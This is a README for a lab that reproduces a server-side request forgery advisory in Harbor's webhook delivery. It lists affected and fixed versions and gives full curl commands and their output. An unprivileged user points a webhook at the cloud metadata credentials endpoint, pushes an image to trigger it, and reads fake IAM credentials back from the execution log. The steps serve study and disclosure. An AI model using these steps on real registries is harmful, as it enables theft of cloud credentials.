# harbor GHSA-2phj-cp9f-qq6w

| Type | Image | Notes |
| ---- | ----- | ----- |
| dqd | ghcr.io/ctrsploit/ghsa-2phj-cp9f-qq6w:latest | points to `v0.1.0` |
| dqd | ghcr.io/ctrsploit/ghsa-2phj-cp9f-qq6w:v0.1.0 | stock Harbor v2.15.2 (vulnerable) + fake IMDS on `169.254.169.254` |
| ctr | ghcr.io/ctrsploit/ghsa-2phj-cp9f-qq6w:ctr_v0.1.0 | - |

Reproduction environment for [GHSA-2phj-cp9f-qq6w](https://github.com/goharbor/harbor/security/advisories/GHSA-2phj-cp9f-qq6w) (no CVE alias): SSRF in Harbor webhook delivery. When a webhook policy is created, `validateTargets()` only checks that the address has an http/https scheme and parses — private, loopback, link-local and cloud-metadata addresses are all accepted, and jobservice later POSTs the stored address verbatim. With the default `project_creation_restriction: everyone`, any registered user can create a project (becoming its ProjectAdmin, which holds `NotificationPolicy:create`) and point a webhook at `http://169.254.169.254/...`. When the target answers with an error status, its response body is written to the webhook execution log, which any project member can read.

Affected: `>= 1.7.0, < 2.13.6` / `>= 2.14.0, < 2.14.5` / `>= 2.15.0, < 2.15.3`; fixed in v2.13.6 / v2.14.5 / v2.15.3 / v2.16.0 (repo advisory severity High 8.5, CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N). This lab `FROM`s the stock `harbor/v2.15.2` deployment and adds only the SSRF victim: a fake IMDS on `169.254.169.254` whose responses carry clearly-fake credentials. For the fixed behavior, run the same reproduction against `harbor/v2.15.3` — webhook creation to that address is rejected there.

The exploit is provided by the ctrsploit toolkit, not this lab image.

## usage

### Start and connect

Recommended:

```shell
$ dqd up vul/ghsa-2phj-cp9f-qq6w
$ ssh dqd-ghsa-2phj-cp9f-qq6w
```

Fallback without dqd CLI or SSH config:

```shell
$ cd vul/ghsa-2phj-cp9f-qq6w
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
$ ./ssh
```

The Harbor web UI and API are exposed on host port `21523`, with the official default credentials `admin` / `Harbor12345`:

```shell
$ curl -fsSL http://127.0.0.1:21523/api/v2.0/health
{"components":[{"name":"core","status":"healthy"},{"name":"database","status":"healthy"},{"name":"jobservice","status":"healthy"},{"name":"portal","status":"healthy"},{"name":"redis","status":"healthy"},{"name":"registry","status":"healthy"},{"name":"registryctl","status":"healthy"}],"status":"healthy"}
```

### reproduce

All commands run inside the VM over SSH.

1. Create an unprivileged user and a project owned by it — its creator automatically becomes ProjectAdmin, which is all this SSRF needs. In the wild such an account comes from UI self-registration (v2.15 rejects API-triggered self-registration with `403 "self-registration cannot be triggered via API"`) or from an institution handing out registry accounts; here the admin creates the same kind of account directly:

```shell
root@harbor-v2-15-2:~# curl -s -o /dev/null -w '%{http_code}\n' -u admin:Harbor12345 -X POST http://127.0.0.1/api/v2.0/users \
    -H 'Content-Type: application/json' \
    -d '{"username":"attacker","email":"attacker@example.com","realname":"attacker","password":"Attacker12345","comment":""}'
201
root@harbor-v2-15-2:~# curl -s -o /dev/null -w '%{http_code}\n' -u attacker:Attacker12345 -X POST http://127.0.0.1/api/v2.0/projects \
    -H 'Content-Type: application/json' \
    -d '{"project_name":"ssrf","metadata":{"public":"false"}}'
201
```

2. Create a webhook policy whose target is the link-local metadata endpoint. The `201 Created` is the bug — a link-local address is accepted without validation:

```shell
root@harbor-v2-15-2:~# curl -s -o /dev/null -w '%{http_code}\n' -u attacker:Attacker12345 -X POST \
    http://127.0.0.1/api/v2.0/projects/ssrf/webhook/policies \
    -H 'Content-Type: application/json' \
    -d '{"name":"ssrf-poc","description":"","enabled":true,"event_types":["PUSH_ARTIFACT"],"targets":[{"type":"http","address":"http://169.254.169.254/latest/meta-data/iam/security-credentials/harbor-instance-role","auth_header":"","skip_cert_verify":false}]}'
201
```

3. Push any image to fire the `PUSH_ARTIFACT` event (`127.0.0.0/8` is a default insecure registry for dockerd, so no daemon configuration is needed):

```shell
root@harbor-v2-15-2:~# docker login 127.0.0.1 -u attacker -p Attacker12345
WARNING! Using --password via the CLI is insecure. Use --password-stdin.

WARNING! Your credentials are stored unencrypted in '/root/.docker/config.json'.
Configure a credential helper to remove this warning. See
https://docs.docker.com/go/credential-store/

Login Succeeded
root@harbor-v2-15-2:~# docker pull alpine:3.19 && docker tag alpine:3.19 127.0.0.1/ssrf/alpine:3.19 && docker push 127.0.0.1/ssrf/alpine:3.19
3.19: Pulling from library/alpine
17a39c0ba978: Pulling fs layer
17a39c0ba978: Verifying Checksum
17a39c0ba978: Download complete
17a39c0ba978: Pull complete
Digest: sha256:6baf43584bcb78f2e5847d1de515f23499913ac9f12bdf834811a3145eb11ca1
Status: Downloaded newer image for alpine:3.19
docker.io/library/alpine:3.19
The push refers to repository [127.0.0.1/ssrf/alpine]
0b44b2151d78: Preparing
0b44b2151d78: Pushed
3.19: digest: sha256:7dc2e94aced06294d5d6d11c91154d4ea696b13a184e9f8b341535257be69e02 size: 527
```

4. The fake IMDS received the delivery — jobservice POSTed to `169.254.169.254` from inside the deployment:

```shell
root@harbor-v2-15-2:~# tail -n 3 /var/log/fake-imds.log
2026-10-09T01:50:09 172.18.0.9 POST /latest/meta-data/iam/security-credentials/harbor-instance-role UA=Go-http-client/1.1
```

5. The response body of the error-status delivery was written to the webhook execution log, which any project member (here: the unprivileged attacker) can read (execution and task IDs are visible via `GET /api/v2.0/projects/ssrf/webhook/policies/1/executions`):

```shell
root@harbor-v2-15-2:~# curl -s -u attacker:Attacker12345 http://127.0.0.1/api/v2.0/projects/ssrf/webhook/policies/1/executions/3/tasks/3/log
2026-10-09T01:50:09Z [INFO] [/jobservice/job/impl/notification/webhook_job.go:73]: start to run webhook job
2026-10-09T01:50:09Z [INFO] [/jobservice/job/impl/notification/webhook_job.go:118]: send request to remote endpoint, body: {"type":"PUSH_ARTIFACT","occur_at":1791510606,"operator":"attacker","event_data":{"resources":[{"digest":"sha256:7dc2e94aced06294d5d6d11c91154d4ea696b13a184e9f8b341535257be69e02","tag":"3.19","resource_url":"harbor.local/ssrf/alpine:3.19"}],"repository":{"date_created":1791510606,"name":"alpine","namespace":"ssrf","repo_full_name":"ssrf/alpine","repo_type":"private"}}}
2026-10-09T01:50:09Z [ERROR] [/jobservice/job/impl/notification/webhook_job.go:76]: exit webhook job, error: abnormal response code: 404, body: {
  "Code": "Success",
  "LastUpdated": "2026-10-08T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIDGHSA2PHJCP9FQQ6W",
  "SecretAccessKey": "FAKE-SECRET-ACCESS-key-for-ssrf-demo-only",
  "Token": "FAKE-SESSION-TOKEN-for-ssrf-demo-only",
  "Expiration": "2038-01-01T00:00:00Z"
}
```

### versions

```shell
root@harbor-v2-15-2:~# docker version
Client: Docker Engine - Community
 Version:           28.2.2
 API version:       1.50
 Go version:        go1.24.3
 Git commit:        e6534b4
 Built:             Fri May 30 12:07:27 2025
 OS/Arch:           linux/amd64
 Context:           default

Server: Docker Engine - Community
 Engine:
  Version:          28.2.2
  API version:       1.50 (minimum API version 1.24)
  Go version:        go1.24.3
  Git commit:        45873be
  Built:             Fri May 30 12:07:27 2025
  OS/Arch:           linux/amd64
  Experimental:      false
 containerd:
  Version:          1.7.27
  GitCommit:        05044ec0a9a75232cad458027ca83437aae3f4da
 runc:
  Version:          1.2.5
  GitCommit:        v1.2.5-0-g59923ef
 docker-init:
  Version:          0.19.0
  GitCommit:        de40ad0
root@harbor-v2-15-2:~# docker ps --format '{{.Names}}\t{{.Image}}' | grep harbor-core
harbor-core	goharbor/harbor-core:v2.15.2
root@harbor-v2-15-2:~# cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/privacy-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu
root@harbor-v2-15-2:~# uname -a
Linux docker-28-2-2 6.8.0-146-generic #146-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep 3 16:12:30 UTC 2026 x86_64 GNU/Linux
```

## build

```shell
make all ENV=vul/ghsa-2phj-cp9f-qq6w
```

for developers:

```dockerfile
FROM ghcr.io/ctrsploit/ghsa-2phj-cp9f-qq6w:ctr_v0.1.0
```

* `FROM` the stock `harbor/v2.15.2` ctr image (published as `ctr_v0.1.21`); Harbor itself is untouched — the 9 containers start at VM boot exactly as in the base env. The only addition is `imds.service`, enabled at build time, which starts `/usr/local/bin/fake-imds.py` and installs two idempotent `iptables -t nat ... REDIRECT` rules.
* `169.254.169.254:80` is not bound directly — harbor's nginx publishes `0.0.0.0:80` in this VM, so a second port-80 bind would fail. Instead `PREROUTING` (traffic from the harbor containers) and `OUTPUT` (VM-local traffic) REDIRECT `169.254.169.254:80` to the fake server on `0.0.0.0:8169`; conntrack NATs the replies, so clients see the plain `http://169.254.169.254/...` URL.
* The fake IMDS answers GET on a known IMDSv1 path with `200`, and everything else with `404` — both carry the same (fake) credentials body. Per the advisory, error-status response bodies are what jobservice writes into the project-readable webhook execution log; this is the read-back channel the lab demonstrates.
* `SIZE=20G`, inherited from the base (Harbor's 9 containers plus PostgreSQL/Redis data).
* Debug the fake IMDS with `journalctl -u imds.service` and `iptables -t nat -S | grep 169.254`; ssh root/root 10.0.2.16 to debug the VM itself.
